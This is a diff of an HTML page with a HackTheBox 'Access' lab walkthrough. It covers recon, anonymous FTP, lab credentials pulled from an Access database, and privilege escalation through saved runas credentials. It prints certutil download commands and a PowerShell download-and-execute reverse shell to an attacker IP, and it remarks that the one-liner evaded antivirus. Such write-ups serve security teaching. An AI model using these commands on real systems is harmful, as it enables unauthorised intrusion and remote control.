@@ -1,104 +1,274 @@
-<html><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hackthebox   Access</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    
 <style>
+    :root {
+        --bg-primary: #0a0a0f;
+        --bg-secondary: #12121a;
+        --bg-code: #1a1a24;
+        --accent: #00ff88;
+        --accent-dim: #00cc6a;
+        --text: #e4e4e7;
+        --text-dim: #a1a1aa;
+        --border: #27272a;
+    }
+    
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
     body {
-        font-family: Arial, sans-serif;
-        max-width: 800px;
+        font-family: 'Segoe UI', system-ui, sans-serif;
+        background: var(--bg-primary);
+        color: var(--text);
+        line-height: 1.8;
+        padding: 40px 20px;
+        max-width: 900px;
         margin: 0 auto;
-        padding: 20px;
-        line-height: 1.6;
-        background-color: #f4f4f4;
     }
-    h1, h2, h3 {
-        color: #333;
-        border-bottom: 2px solid #ddd;
-        padding-bottom: 10px;
-        margin-bottom: 20px;
+    
+    .back-link {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        color: var(--accent);
+        text-decoration: none;
+        font-size: 0.875rem;
+        margin-bottom: 32px;
+        padding: 8px 16px;
+        background: var(--bg-secondary);
+        border-radius: 8px;
+        border: 1px solid var(--border);
+        transition: all 0.3s;
     }
-    p {
-        margin-bottom: 20px;
+    
+    .back-link:hover {
+        background: var(--bg-code);
+        border-color: var(--accent);
     }
+    
+    h1 {
+        font-size: 2.5rem;
+        margin-bottom: 16px;
+        color: var(--text);
+        border-bottom: 2px solid var(--accent);
+        padding-bottom: 16px;
+    }
+    
+    h2 {
+        font-size: 1.75rem;
+        margin: 48px 0 16px;
+        color: var(--text);
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+    
+    h2::before {
+        content: '##';
+        color: var(--accent);
+        font-family: monospace;
+        font-size: 1rem;
+    }
+    
+    h3 {
+        font-size: 1.25rem;
+        margin: 32px 0 12px;
+        color: var(--text-dim);
+    }
+    
+    p { margin-bottom: 16px; }
+    
+    a {
+        color: var(--accent);
+        text-decoration: none;
+        border-bottom: 1px solid transparent;
+        transition: border-color 0.3s;
+    }
+    
+    a:hover { border-bottom-color: var(--accent); }
+    
     img {
         max-width: 100%;
         height: auto;
-        display: block;
-        margin: 0 auto 20px auto;
+        border-radius: 12px;
+        margin: 24px 0;
+        border: 1px solid var(--border);
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
     }
+    
     code {
-        background-color: #f9f9f9;
-        border: 1px solid #ccc;
-        padding: 5px;
-        border-radius: 5px;
+        font-family: 'JetBrains Mono', 'Fira Code', monospace;
+        background: var(--bg-code);
+        padding: 2px 8px;
+        border-radius: 4px;
+        font-size: 0.9em;
+        color: var(--accent);
+        border: 1px solid var(--border);
     }
+    
     pre {
-        background-color: #333;
-        color: #f8f8f2;
-        padding: 10px;
-        border-radius: 5px;
+        background: var(--bg-secondary);
+        padding: 20px;
+        border-radius: 12px;
         overflow-x: auto;
+        margin: 24px 0;
+        border: 1px solid var(--border);
+        position: relative;
+    }
+    
+    pre::before {
+        content: 'terminal';
+        position: absolute;
+        top: 8px;
+        right: 12px;
+        font-size: 0.75rem;
+        color: var(--text-dim);
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+    
+    pre code {
+        background: none;
+        padding: 0;
+        border: none;
+        color: var(--text);
+    }
+    
+    blockquote {
+        border-left: 3px solid var(--accent);
+        padding-left: 20px;
+        margin: 24px 0;
+        color: var(--text-dim);
+        font-style: italic;
+    }
+    
+    ul, ol {
+        margin: 16px 0 16px 24px;
+    }
+    
+    li {
+        margin-bottom: 8px;
+    }
+    
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 24px 0;
+    }
+    
+    th, td {
+        padding: 12px 16px;
+        text-align: left;
+        border: 1px solid var(--border);
+    }
+    
+    th {
+        background: var(--bg-secondary);
+        color: var(--accent);
+        font-weight: 600;
+    }
+    
+    tr:nth-child(even) { background: var(--bg-secondary); }
+    
+    hr {
+        border: none;
+        height: 1px;
+        background: var(--border);
+        margin: 40px 0;
+    }
+    
+    .meta {
+        display: flex;
+        gap: 24px;
+        margin-bottom: 32px;
+        padding: 16px;
+        background: var(--bg-secondary);
+        border-radius: 8px;
+        font-size: 0.875rem;
+        color: var(--text-dim);
+    }
+    
+    .meta-item {
+        display: flex;
+        align-items: center;
+        gap: 6px;
     }
 </style>
-</head><body><p>Greetings everyone ! Today I would like to present my analysis, perspective and methodology on Access machine from <strong>HackThebox</strong></p>
+
+</head>
+<body>
+    <a href="../../index.html" class="back-link">← Back to Index</a>
+    <div class="meta">
+        <span class="meta-item">📅 Updated: 2025-12-30</span>
+        <span class="meta-item">📂 HTB-Access</span>
+    </div>
+    <article>
+        <p>Greetings everyone ! Today I would like to present my analysis, perspective and methodology on Access machine from <strong>HackThebox</strong></p>
 
 <p>Let's add our host ip addresss to <strong>/etc/hosts</strong> file in order to interact with target host easily.</p>
 
-<p>Run the command I embedded below ->
-<code>
-nano /etc/hosts
-</code></p>
+<p>Run the command I embedded below -></p>
 
-<p><img src="./images/1.png" alt="alt text" /></p>
+<pre><code>nano /etc/hosts
+</code></pre>
+
+<p><img src="./images/1.png" alt="1.png" /></p>
 
 <p>I prefer to conduct both <strong>manual &amp; automated reconnaissance</strong> simultaneously. While fuzzing tools are processing the target, at the same time I manually check whether application runs on <strong>HTTP/HTTPS</strong> ports.</p>
 
 <p>To understand my connectivity, I sent ICMP echo packets (ping) to the target ->
-<img src="./images/2.png" alt="alt text" /></p>
+<img src="./images/2.png" alt="2.png" /></p>
 
 <h2>Reconnaissance</h2>
 
 <p>Apply <strong>GoBuster</strong> &amp; <strong>Dirsearch</strong> at the same time with different terminal sessions -></p>
 
-<p><code>
-gobuster dir -u http://access.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -r
-</code></p>
+<pre><code>gobuster dir -u http://access.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -r
+</code></pre>
 
 <p>It will be great to use <strong>GoBuster</strong> with <code>-r</code> parameter since it also tries deepen directories if it can find properly.</p>
 
 <p>Meanwhile, I manually checked the page via visiting <code>http://access.htb</code> ->
-<img src="./images/3.png" alt="alt text" /></p>
+<img src="./images/3.png" alt="3.png" /></p>
 
 <p>My wordlist was not terrible in most cases ,but in this scenario it could not find juicy endpoints. Therefore, I used <code>raft-large-files-lowercase.txt</code>.</p>
 
 <p>According to <code>whatweb</code>, application deployed on <code>IIS 7.5</code> ->
-<img src="./images/4.png" alt="alt text" /></p>
+<img src="./images/4.png" alt="4.png" /></p>
 
 <p>Now, we have to open another corridor through host port discovery phase -></p>
 
 <p><code>sudo nmap -sV -sC -Pn access.htb</code></p>
 
 <p>The host was deployed on <code>Windows XP</code> :D
-<img src="./images/5.png" alt="alt text" /></p>
+<img src="./images/5.png" alt="5.png" /></p>
 
 <p>In most cases, <strong>Windows operating system</strong> enables users to contact directly to <strong>SMB protocol</strong>. However, as you can see the service discovery results, we have <strong>Telnet</strong> protocol active. It means it will be suitable to move forward it ,yet <strong>Telnet</strong> asked me credentials to access the service.</p>
 
-<p><img src="./images/10.png" alt="alt text" /></p>
+<p><img src="./images/10.png" alt="10.png" /></p>
 
 <p>Full scope port scan -></p>
 
 <p><code>sudo nmap -sV -Pn --script=vuln access.htb</code></p>
 
-<p><img src="./images/6.png" alt="alt text" /></p>
+<p><img src="./images/6.png" alt="6.png" /></p>
 
 <p>Regarding to  the above port scanning result, I decided to FTP protocol because of the message appeared on terminal "<strong>Can't directory listing</strong>" -></p>
 
 <p><code>ftp access.htb</code> was enough to reach FTP service. Simply, understand the <code>anonymous</code> user from nmap output then connect via anon user -></p>
 
-<p><img src="./images/7.png" alt="alt text" /></p>
+<p><img src="./images/7.png" alt="7.png" /></p>
 
 <p>I downloaded both files via <code>GET</code> command in FTP respectively -></p>
 
-<p><img src="./images/8.png" alt="alt text" /></p>
+<p><img src="./images/8.png" alt="8.png" /></p>
 
-<p><img src="./images/9.png" alt="alt text" /></p>
+<p><img src="./images/9.png" alt="9.png" /></p>
 
 <p>Let's analyze the files that we downloaded:</p>
 
@@ -108,14 +278,14 @@ gobuster dir -u http://access.htb -w /usr/share/wordlists/seclists/Discovery/Web
 
 <p>However, the tool was not able to identify or extract data about our .mdb file -></p>
 
-<p><img src="./images/11.png" alt="alt text" /></p>
+<p><img src="./images/11.png" alt="11.png" /></p>
 
 <p>PST files used in mainly an outlook email format.</p>
 
-<p><img src="./images/12.png" alt="alt text" /></p>
+<p><img src="./images/12.png" alt="12.png" /></p>
 
 <p>The result was the same. Moreover, I utilized <code>7z</code> tool to extract archived data ->
-<img src="./images/13.png" alt="alt text" /></p>
+<img src="./images/13.png" alt="13.png" /></p>
 
 <p>Now we understand that we have to <code>bruteforce</code> zip file with <code>john</code> or <code>hashcat</code> -></p>
 
@@ -123,22 +293,21 @@ gobuster dir -u http://access.htb -w /usr/share/wordlists/seclists/Discovery/Web
 
 <p>https://www.webasha.com/blog/password-cracking-with-hashcat-techniques-and-best-practices-577</p>
 
-<p><img src="./images/14.png" alt="alt text" /></p>
+<p><img src="./images/14.png" alt="14.png" /></p>
 
 <p>I did not find regarded password for zip file ->
-<img src="./images/15.png" alt="alt text" /></p>
+<img src="./images/15.png" alt="15.png" /></p>
 
 <p>Let me extract strings in <code>backup.mdb</code> file since I could not see any match with seclist's large dataset. Therefore, I want to extract strings in db file.</p>
 
-<p><code>
-strings -n 8 backup.mdb
-</code></p>
+<pre><code>strings -n 8 backup.mdb
+</code></pre>
 
 <p>It did not work at all :( ->
-<img src="./images/16.png" alt="alt text" /></p>
+<img src="./images/16.png" alt="16.png" /></p>
 
 <p>I wanted to detect the type of file ,so run <code>file</code> command ->
-<img src="./images/17.png" alt="alt text" /></p>
+<img src="./images/17.png" alt="17.png" /></p>
 
 <p>After all, I recognized that I never switch on <code>binary</code> mode to retrieve fully integral part of my files ,so let's move binary mode and download files again -></p>
 
@@ -148,7 +317,7 @@ strings -n 8 backup.mdb
 
 <p>Extract credentials from <strong>auth_user</strong> table -></p>
 
-<p><img src="./images/18.png" alt="alt text" /></p>
+<p><img src="./images/18.png" alt="18.png" /></p>
 
 <p>I found a page, automatically parses mdb database files &amp; construct it in a reasonable way -></p>
 
@@ -156,33 +325,32 @@ strings -n 8 backup.mdb
 
 <p>Now, as you can see below, I successfully see the credentials for target</p>
 
-<p><img src="./images/19.png" alt="alt text" /></p>
+<p><img src="./images/19.png" alt="19.png" /></p>
 
 <p>Now let's try to extract zip file via given credentials -></p>
 
-<p><img src="./images/20.png" alt="alt text" /></p>
+<p><img src="./images/20.png" alt="20.png" /></p>
 
 <p>Second password was the correct one -></p>
 
-<p><code>
-data[0] = { id: 0, "id": "25", "username": "admin", "password": "admin", "Status": "1", "last_login": "08/23/18 21:11:47", "RoleID": "26", "Remark": "", };
+<pre><code>data[0] = { id: 0, "id": "25", "username": "admin", "password": "admin", "Status": "1", "last_login": "08/23/18 21:11:47", "RoleID": "26", "Remark": "", };
  data[1] = { id: 1, "id": "27", "username": "engineer", "password": "access4u@security", "Status": "1", "last_login": "08/23/18 21:13:36", "RoleID": "26", "Remark": "", };
  data[2] = { id: 2, "id": "28", "username": "backup_admin", "password": "admin", "Status": "1", "last_login": "08/23/18 21:14:02", "RoleID": "26", "Remark": "", };
-</code></p>
+</code></pre>
 
-<p><img src="./images/21.png" alt="alt text" /></p>
+<p><img src="./images/21.png" alt="21.png" /></p>
 
 <p>Now try the tool I highlighted ->
-<img src="./images/22.png" alt="alt text" /></p>
+<img src="./images/22.png" alt="22.png" /></p>
 
 <p>Straightforwardly, I just run the tool without parameters.</p>
 
 <p><code>readpst 'Access Control.pst'</code></p>
 
-<p><img src="./images/23.png" alt="alt text" /></p>
+<p><img src="./images/23.png" alt="23.png" /></p>
 
 <p><code>cat 'Access Control.pst'</code> to read the content of the pst file ->
-<img src="./images/24.png" alt="alt text" /></p>
+<img src="./images/24.png" alt="24.png" /></p>
 
 <p>Observe the account's password from above image.</p>
 
@@ -192,25 +360,25 @@ data[0] = { id: 0, "id": "25", "username": "admin", "password": "admin", "Status
 
 <p><code>telnet access.htb 23</code></p>
 
-<p><img src="./images/25.png" alt="alt text" /></p>
+<p><img src="./images/25.png" alt="25.png" /></p>
 
 <p>Majority of the times, user flag mainly located at Desktop folder in Windows OS -></p>
 
-<p><img src="./images/26.png" alt="alt text" /></p>
+<p><img src="./images/26.png" alt="26.png" /></p>
 
 <p><code>type user.txt</code>
-<img src="./images/27.png" alt="alt text" /></p>
+<img src="./images/27.png" alt="27.png" /></p>
 
 <p>After I submitted user flag, I did not understand my privileges. That's why, I moved <code>Administrator</code> user's directory ,but it did not work.</p>
 
-<p><img src="./images/28.png" alt="alt text" /></p>
+<p><img src="./images/28.png" alt="28.png" /></p>
 
 <p>Let's enumerate system -></p>
 
 <p><code>systeminfo</code> -></p>
 
 <p>The crucial aspect will be OS kernel version &amp; type of Windows
-<img src="./images/29.png" alt="alt text" /></p>
+<img src="./images/29.png" alt="29.png" /></p>
 
 <p><strong>Hacktricks</strong> will help you fully especially for reconnaissance in Windows systems -></p>
 
@@ -220,19 +388,19 @@ data[0] = { id: 0, "id": "25", "username": "admin", "password": "admin", "Status
 
 <p><code>whoami /all</code></p>
 
-<p><img src="./images/30.png" alt="alt text" /></p>
+<p><img src="./images/30.png" alt="30.png" /></p>
 
 <p>After my couple of attempts, I discovered an exploit on exploitdb just by searchin my Windows version: <strong>MS11-046</strong></p>
 
 <p>https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/CVE-2011-1249.c</p>
 
-<p><img src="./images/31.png" alt="alt text" /></p>
+<p><img src="./images/31.png" alt="31.png" /></p>
 
 <p>I could not send exploit to <code>Temp</code> folder. Instead I tried &amp; run in my current user's Desktop folder. However, group policies restricted me to run exploit.</p>
 
 <p><code>certutil.exe -urlcache -f http://10.10.14.45:1234/MS11-046.exe MS11-046.exe</code></p>
 
-<p><img src="./images/32.png" alt="alt text" /></p>
+<p><img src="./images/32.png" alt="32.png" /></p>
 
 <p>Let me also send <code>Winpeas</code> -></p>
 
@@ -243,33 +411,31 @@ data[0] = { id: 0, "id": "25", "username": "admin", "password": "admin", "Status
 <p><code>certutil.exe -urlcache -f http://10.10.14.45:1234/winPEASx64.exe winpeas.exe</code></p>
 
 <p>It was not possible to run anything on my directory ->
-<img src="./images/33.png" alt="alt text" /></p>
+<img src="./images/33.png" alt="33.png" /></p>
 
 <p>Enumerating user accounts can be suitable to understand hierarchy in the host -></p>
 
-<p><code>
-net user
-</code></p>
+<pre><code>net user
+</code></pre>
 
-<p><img src="./images/34.png" alt="alt text" /></p>
+<p><img src="./images/34.png" alt="34.png" /></p>
 
 <p>Moreover, I want to see <code>Public</code> directory whether there is useful information or not -></p>
 
 <p>Even though the <code>Desktop</code> folder hidden, I hooked the directory &amp; encountered a file formatted in <code>lnk</code> extension depicts like a shortcut file. Then I saw a long command showing that whenever user run this program then it will be run with administrator privileges via <strong>runas</strong> .</p>
 
-<p><img src="./images/35.png" alt="alt text" /></p>
+<p><img src="./images/35.png" alt="35.png" /></p>
 
 <p>The absolute path points out the full path of <code>runas.exe</code> and the security program located in the system. Let me try something like this -></p>
 
-<p><code>
-runas.exe /user:ACCESS\Administrator /savecred cmd.exe
-</code></p>
+<pre><code>runas.exe /user:ACCESS\Administrator /savecred cmd.exe
+</code></pre>
 
-<p><img src="./images/36.png" alt="alt text" /></p>
+<p><img src="./images/36.png" alt="36.png" /></p>
 
 <p>Now it works ,but I could not switch the administrator <code>cmd</code> shell -></p>
 
-<p><img src="./images/37.png" alt="alt text" /></p>
+<p><img src="./images/37.png" alt="37.png" /></p>
 
 <p>What about reverse shell ?</p>
 
@@ -281,7 +447,7 @@ runas.exe /user:ACCESS\Administrator /savecred cmd.exe
 
 <p>https://github.com/ivan-sincek/powershell-reverse-tcp</p>
 
-<p><img src="./images/38.png" alt="alt text" /></p>
+<p><img src="./images/38.png" alt="38.png" /></p>
 
 <p>Now send the payload target &amp; call listener on your attacker machine -></p>
 
@@ -289,33 +455,31 @@ runas.exe /user:ACCESS\Administrator /savecred cmd.exe
 
 <p>https://github.com/brightio/penelope</p>
 
-<p><img src="./images/39.png" alt="alt text" /></p>
+<p><img src="./images/39.png" alt="39.png" /></p>
 
-<p><code>
-1) penelope 1984
+<pre><code>1) penelope 1984
 2) certutil.exe -urlcache -f http://10.10.14.45:1234/onurshell.ps1 onurshell.ps1
 3) runas.exe /user:ACCESS\Administrator /savecred "powershell.exe -ExecutionPolicy Unrestricted -File .\onurshell.ps1"
-</code></p>
+</code></pre>
 
 <p>After my attempts, I could not get shell and run the powershell as Administrator -></p>
 
-<p><code>
-runas.exe /user:ACCESS\Administrator /savecred "powershell.exe -ExecutionPolicy Unrestricted -File C:\Users\security\onurshell.ps1"
-</code></p>
+<pre><code>runas.exe /user:ACCESS\Administrator /savecred "powershell.exe -ExecutionPolicy Unrestricted -File C:\Users\security\onurshell.ps1"
+</code></pre>
 
 <p>In order to make ready to run our Nishang's <code>Powershell</code> script, you must add additional function call for reverse listener that we implemented via <code>Penelope</code>. Hence, I began to modify &amp; add the necessary command.</p>
 
 <p>Because I wanted to catch packet in my host machine, I point out my ip address &amp; binding port -></p>
 
-<p><img src="./images/40.png" alt="alt text" /></p>
+<p><img src="./images/40.png" alt="40.png" /></p>
 
 <p>You must comply with the manual scripting phase before you catch reverse shell connection. -></p>
 
-<p><img src="./images/41.png" alt="alt text" /></p>
+<p><img src="./images/41.png" alt="41.png" /></p>
 
 <p>One-Liner shell script combination would work because I could not run in the memory when I downloaded the direct payload. </p>
 
-<p><img src="./images/42.png" alt="alt text" /></p>
+<p><img src="./images/42.png" alt="42.png" /></p>
 
 <p>Reference:
 https://github.com/samratashok/nishang</p>
@@ -324,35 +488,36 @@ https://github.com/samratashok/nishang</p>
 
 <p>https://nored0x.github.io/red-teaming/windows-enumeration/</p>
 
-<p><img src="./images/43.png" alt="alt text" /></p>
+<p><img src="./images/43.png" alt="43.png" /></p>
 
 <p>Got it !</p>
 
-<p><img src="./images/44.png" alt="alt text" /></p>
+<p><img src="./images/44.png" alt="44.png" /></p>
 
 <p>It is clear that direct memory execution of the payload did not work because of the AV protection. Therefore, one-liner fully one shot reverse shell payload would work.</p>
 
 <p>I was going to run the command as -></p>
 
-<p><code>
-powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.45:1234/onurshell2.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.45 -Port 1984
-</code></p>
+<pre><code>powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.45:1234/onurshell2.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.45 -Port 1984
+</code></pre>
 
 <p>Let's combine it with <code>runas</code> -></p>
 
-<p><code>
-runas.exe /user:ACCESS\Administrator /savecred "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.45:1234/onurshell2.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.45 -Port 1984"
-</code></p>
+<pre><code>runas.exe /user:ACCESS\Administrator /savecred "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.45:1234/onurshell2.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.45 -Port 1984"
+</code></pre>
 
 <p>After my reverse shell command execution through <strong>runas</strong>, first it directly downloaded a file calleed <strong>onurshell2.ps1</strong> in my host machine then permanently run the script without writing the process to the memory. That's why, we got shell since AV (antivirus) did not create alarm for our activity.</p>
 
-<p><img src="./images/45.png" alt="alt text" /></p>
+<p><img src="./images/45.png" alt="45.png" /></p>
 
 <p>At the same time reverse shell handler (penelope), established a administrative connection with my host. You can directly understand via the path <code>C:\Windows\system32</code> indicating the system path. Only the administrative privileges can access to the system path. Let's check whether my assumption correct or not :)</p>
 
-<p><img src="./images/46.png" alt="alt text" /></p>
+<p><img src="./images/46.png" alt="46.png" /></p>
 
 <p>Now reach out the <code>root</code> flag in <code>cd ../../Users/administrator</code> and retrieve in <code>Desktop</code> -></p>
 
-<p><img src="./images/47.png" alt="alt text" /></p>
-</body></html>
+<p><img src="./images/47.png" alt="47.png" /></p>
+
+    </article>
+</body>
+</html>
